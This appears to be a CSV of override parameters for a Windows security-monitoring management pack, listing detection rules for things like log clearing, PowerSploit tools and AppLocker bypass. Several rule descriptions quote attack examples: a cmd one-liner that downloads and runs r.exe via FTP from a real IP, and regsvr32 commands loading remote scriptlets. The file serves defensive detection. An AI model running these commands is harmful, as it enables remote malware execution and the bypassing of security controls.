ManagementPackId,WorkflowId,WorkflowType,DisplayName,Description,OverrideParameterName,OverrideParameterType,DefaultValue,Balanced,Essentials,Notes
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess,Rule,Security Monitoring Forwarded Events:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess,Rule,Security Monitoring Forwarded Events:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess,Rule,Security Monitoring Forwarded Events:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.CollectionRule.CollectLAPSEvents,Rule,Security Monitoring: Collect LAPS Events,Description for the new event collection rule.,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.CollectionRule.CollectLAPSEvents,Rule,Security Monitoring: Collect LAPS Events,Description for the new event collection rule.,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand,Rule,Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand,Rule,Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand,Rule,Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition,Rule,Security Monitoring;  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition,Rule,Security Monitoring;  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition,Rule,Security Monitoring;  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.DCOUModify,Rule,Security Monitoring: Modification has been made to the DC OU,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.DCOUModify,Rule,Security Monitoring: Modification has been made to the DC OU,,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.DCOUModify,Rule,Security Monitoring: Modification has been made to the DC OU,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetHTTPStatus,Rule,Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetHTTPStatus,Rule,Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetHTTPStatus,Rule,Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableFilePath3,string,ReplacewithPathtoOverride,ReplacewithPathtoOverride,ReplacewithPathtoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableExe1,string,ReplacewithExetoOverride,ReplacewithExetoOverride,ReplacewithExetoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableFilePath1,string,ReplacewithPathtoOverride,ReplacewithPathtoOverride,ReplacewithPathtoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableFilePath2,string,ReplacewithPathtoOverride,ReplacewithPathtoOverride,ReplacewithPathtoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableExe3,string,ReplacewithExetoOverride,ReplacewithExetoOverride,ReplacewithExetoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableExe2,string,ReplacewithExetoOverride,ReplacewithExetoOverride,ReplacewithExetoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.DomainAdminChange,Rule,Security Monitoring:  Domain Admins membership has changed,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Accounts.DomainAdminChange,Rule,Security Monitoring:  Domain Admins membership has changed,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.DomainAdminChange,Rule,Security Monitoring:  Domain Admins membership has changed,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetKeystroke,Rule,Security Monitoring:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetKeystroke,Rule,Security Monitoring:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetKeystroke,Rule,Security Monitoring:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,IntervalSeconds,int,600,600,600,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,TimeOut,int,300,300,300,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,SyncTime,string,,,,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemLogCleared,Rule,Security Monitoring:  The system Log was cleared,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemLogCleared,Rule,Security Monitoring:  The system Log was cleared,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.SystemLogCleared,Rule,Security Monitoring:  The system Log was cleared,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.EventCollection.LanMan,Rule,Security Monitoring:  Collect LANMAN Authentication,Collection rule to collect all authentication events using LanManager to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.EventCollection.LanMan,Rule,Security Monitoring:  Collect LANMAN Authentication,Collection rule to collect all authentication events using LanManager to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SystemLogCleared,Rule,Security Monitoring Forwarded Events:  System Log was Cleared,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SystemLogCleared,Rule,Security Monitoring Forwarded Events:  System Log was Cleared,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SystemLogCleared,Rule,Security Monitoring Forwarded Events:  System Log was Cleared,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.SeDebugPrivilegeEscalation,Rule,Security Monitoring: SeDebugPrivilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.Event.SeDebugPrivilegeEscalation,Rule,Security Monitoring: SeDebugPrivilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.SeDebugPrivilegeEscalation,Rule,Security Monitoring: SeDebugPrivilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Source,Rule,Security Monitoring:  Possible WMI Remote Attempt Made From this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Source,Rule,Security Monitoring:  Possible WMI Remote Attempt Made From this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Source,Rule,Security Monitoring:  Possible WMI Remote Attempt Made From this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeEncodedCommand,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeEncodedCommand,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeEncodedCommand,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.PSExec,Rule,Security Monitoring:  PSEXEC in Use,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.PSExec,Rule,Security Monitoring:  PSEXEC in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.PSExec,Rule,Security Monitoring:  PSEXEC in Use,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.KillWindowsDefender,Rule,Security Monitoring:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.KillWindowsDefender,Rule,Security Monitoring:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.KillWindowsDefender,Rule,Security Monitoring:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.SchemaAdminChange,Rule,Security Monitoring:  Schema Admins membership has changed,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Accounts.SchemaAdminChange,Rule,Security Monitoring:  Schema Admins membership has changed,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.SchemaAdminChange,Rule,Security Monitoring:  Schema Admins membership has changed,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetDLLLoadPath,Rule,Security Monitoring ForwardedEvents:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetDLLLoadPath,Rule,Security Monitoring ForwardedEvents:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetDLLLoadPath,Rule,Security Monitoring ForwardedEvents:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Priority,int,1,1,1,
